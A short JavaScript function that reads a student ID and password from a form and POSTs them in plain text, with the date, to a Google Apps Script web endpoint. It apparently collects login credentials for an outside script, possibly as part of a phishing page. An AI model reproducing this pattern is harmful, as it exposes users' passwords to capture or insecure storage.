function submitFun() {
    const studId = document.getElementById('studId').value;
    const studPass = document.getElementById('studPass').value;
  
    const data = {
      studId: studId,
      studPass: studPass,
      date: new Date().toLocaleDateString()
    };
  
    const googleAppsScriptURL = 'https://script.google.com/macros/s/AKfycbwGc0vGWmSfTleJl_hPhu1Cazb-EZ9E_1arDPW_NMcVieYOCQvIWHu0n0wFPLL4aM6j/exec';
  
    fetch(googleAppsScriptURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
      .then(response => {
        console.log('Data sent:', response);
      })
      .catch(error => {
        console.error('Error:', error);
      });
  }
  